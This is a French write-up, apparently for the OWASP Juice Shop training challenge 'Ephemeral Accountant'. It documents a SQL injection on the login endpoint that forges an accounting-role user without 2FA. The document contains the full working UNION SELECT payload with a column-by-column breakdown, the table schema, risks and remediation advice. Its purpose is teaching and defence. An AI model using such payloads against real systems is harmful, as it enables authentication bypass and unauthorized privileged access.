# **Rapport de vulnérabilité — Ephemeral Accountant (Injection SQL)**

## **1. Méthodologie**

1. Identification du point d'injection : l'endpoint de connexion `/rest/user/login` accepte les paramètres `email` et `password` au format JSON.
2. Analyse du schéma de la table `Users` via injection SQL sur l'endpoint de recherche pour obtenir l'ordre exact des colonnes.
3. Découverte que le champ `totpSecret` contrôle l'activation de la double authentification (2FA/TOTP).
4. Construction d'un payload UNION SELECT créant un utilisateur "éphémère" (temporaire) avec le rôle `accounting` mais sans 2FA activée.
5. Payload final utilisé :
```json
{
  "email": "' UNION SELECT 15,'','acc0unt4nt@juice-sh.op','5f4dcc3b5aa765d61d8327deb882cf99','accounting','','0.0.0.0','default.svg','',1,'1999-08-16 14:14:41.644 +00:00','1999-08-16 14:33:41.930 +00:00',NULL--",
  "password": "password"
}
```
6. Connexion réussie au compte `acc0unt4nt@juice-sh.op` sans avoir jamais créé ce compte dans la base de données.

### **Techniques utilisées**

* Injection SQL UNION SELECT
* Reconnaissance du schéma de base de données (extraction de `sqlite_schema`)
* Création d'un utilisateur fantôme (ephemeral user) via injection
* Bypass de l'authentification à deux facteurs (2FA/TOTP)
* Hachage MD5 pour correspondance avec le mécanisme de vérification des mots de passe

### **Outils utilisés**

* Burp Suite / Proxy HTTP pour intercepter et modifier les requêtes POST
* Outils de développement du navigateur (Network tab)
* Générateur de hash MD5 en ligne ou via terminal (`echo -n "password" | md5sum`)

---

## **2. Vulnérabilité**

* **Type :** Injection SQL
* **Composant affecté :** API de connexion (`/rest/user/login`)
* **Sévérité :** **Critique** (contournement complet de l'authentification et création d'utilisateurs privilégiés)

### **Détails techniques**

L'application hache le mot de passe fourni avec MD5 **avant** de l'insérer dans la requête, d'où la nécessité de fournir le hash MD5 correspondant dans le payload UNION.

**Payload décomposé :**

```sql
' UNION SELECT
  15,                                      -- id (doit être unique, inexistant dans la base)
  '',                                      -- username (vide)
  'acc0unt4nt@juice-sh.op',               -- email (cible du challenge)
  '5f4dcc3b5aa765d61d8327deb882cf99',     -- password (MD5 de "password")
  'accounting',                            -- role (rôle comptable privilégié)
  '',                                      -- deluxeToken (vide)
  '0.0.0.0',                              -- lastLoginIp
  'default.svg',                           -- profileImage
  '',                                      -- totpSecret (VIDE = pas de 2FA !)
  1,                                       -- isActive (compte actif)
  '1999-08-16 14:14:41.644 +00:00',      -- createdAt
  '1999-08-16 14:33:41.930 +00:00',      -- updatedAt
  NULL                                     -- deletedAt (non supprimé)
--                                         -- Commentaire SQL pour neutraliser la suite
```

**Points critiques :**

1. **Ordre des colonnes** : Doit correspondre EXACTEMENT à la structure de la table Users
2. **totpSecret vide** : Permet de bypasser la vérification 2FA (si NULL ou '', pas de TOTP demandé)
3. **Password hashé** : Le hash MD5 dans l'injection doit correspondre au mot de passe fourni dans le JSON
4. **ID inexistant** : Utiliser un ID qui n'existe pas dans la base (ex: 15, 99999) pour créer un compte fantôme
5. **Commentaire `--`** : Neutralise la condition `AND deletedAt IS NULL` de la requête originale

### **Structure de la table Users**

```sql
CREATE TABLE `Users` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `username` VARCHAR(255) DEFAULT '',
  `email` VARCHAR(255) UNIQUE,
  `password` VARCHAR(255),
  `role` VARCHAR(255) DEFAULT 'customer',
  `deluxeToken` VARCHAR(255) DEFAULT '',
  `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0',
  `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg',
  `totpSecret` VARCHAR(255) DEFAULT '',
  `isActive` TINYINT(1) DEFAULT 1,
  `createdAt` DATETIME NOT NULL,
  `updatedAt` DATETIME NOT NULL,
  `deletedAt` DATETIME
)
```

---

## **3. Risques**

* Contournement complet du système d'authentification
* Création de comptes privilégiés (rôle `accounting`, `admin`) sans autorisation
* Bypass de la double authentification (2FA/TOTP) sur des comptes sensibles
* Accès non autorisé à des fonctionnalités et données restreintes
* Possibilité d'élévation de privilèges via injection de rôles arbitraires
* Aucune trace de l'utilisateur fantôme dans la base de données (compte éphémère)

---

## **4. Actions**

### **Mesures de sécurité additionnelles**

* Valider et échapper toutes les entrées utilisateur avant traitement SQL
* Implémenter une validation stricte du format d'email (regex, whitelist)
* Limiter les privilèges du compte de base de données utilisé par l'application
* Implémenter un système de rate limiting sur l'endpoint de login
* Mettre en place une détection d'anomalies pour les requêtes suspectes
* Implémenter un WAF (Web Application Firewall) avec règles anti-injection SQL
* Chiffrer les secrets TOTP (`totpSecret`) en base de données

### **Bonnes pratiques d'authentification**

* Ne jamais stocker les mots de passe en clair ou avec des hashs faibles (MD5, SHA-1)
* Implémenter un mécanisme de verrouillage de compte après X tentatives échouées
* Utiliser des tokens JWT avec expiration courte
* Exiger la 2FA pour tous les comptes privilégiés (admin, accounting)
* Valider l'intégrité des données retournées par la base de données

---
